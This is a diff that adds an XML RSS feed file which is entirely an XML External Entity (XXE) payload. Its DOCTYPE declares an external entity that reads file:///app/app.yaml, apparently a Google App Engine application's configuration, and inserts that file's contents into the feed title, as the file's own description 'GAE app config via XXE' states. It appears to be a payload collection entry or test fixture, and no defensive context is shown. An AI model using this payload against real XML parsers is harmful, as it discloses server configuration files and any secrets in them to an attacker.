@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE rss [
+  <!ENTITY xxe SYSTEM "file:///app/app.yaml">
+]>
+<rss version="2.0">
+  <channel>
+    <title>&xxe;</title>
+    <link>https://example.com</link>
+    <description>GAE app config via XXE</description>
+  </channel>
+</rss>
